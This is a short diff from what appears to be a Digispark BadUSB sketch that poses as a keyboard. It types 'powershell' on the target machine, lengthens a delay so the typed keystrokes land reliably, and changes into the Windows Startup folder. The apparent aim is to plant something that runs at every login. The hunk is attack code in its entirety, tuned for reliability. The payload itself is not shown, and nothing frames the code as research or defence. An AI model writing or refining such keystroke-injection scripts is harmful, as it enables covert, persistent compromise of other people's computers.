@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboard.delay(200);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(2500);
   DigiKeyboard.print("cd ");
   DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
   DigiKeyboard.print("AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
